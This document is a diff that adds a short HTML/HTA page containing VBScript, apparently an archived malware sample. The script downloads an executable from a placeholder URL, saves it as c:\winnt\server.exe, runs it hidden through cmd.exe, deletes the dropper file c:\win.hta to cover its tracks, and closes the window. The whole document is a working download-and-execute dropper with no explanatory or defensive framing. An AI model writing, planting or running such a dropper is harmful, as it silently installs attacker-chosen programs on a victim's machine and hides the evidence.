@@ -1,0 +1,35 @@
+<html>
+<object id=wsh classid=clsid:F935DC22-1CF0-11D0-ADB9-00C04FD58A0B></object>
+<script language="VBScript">
+Function HttpDoGet(url)
+     set oReq  =  CreateObject("Microsoft.XMLHTTP")
+     oReq.open  "GET",url,false
+     oReq.send
+     If oReq.status=200 then
+     HttpDoGet=oReq.responseBody
+        SaveFile HttpDoGet,"c:\winnt\server.exe"
+     End If
+     Set oReq=nothing
+End Function
+sub SaveFile(str,fName)
+Set objStream = CreateObject("ADODB.Stream")
+objStream.Type = 1
+objStream.Open
+objstream.write str
+objstream.SaveToFile fName,2
+objstream.Close()
+set objstream = nothing
+exewin()
+End sub
+Sub exewin()
+set wshshell=createobject ("wscript.shell" ) 
+a=wshshell.run ("cmd.exe /c c:\winnt\server.exe",0) 
+b=wshshell.run ("cmd.exe /c del c:\win.hta",0) 
+window.close 
+End Sub
+HttpDoGet "http://127.0.0.1/xxx.exe"
+</script>
+</html>
+
+
+
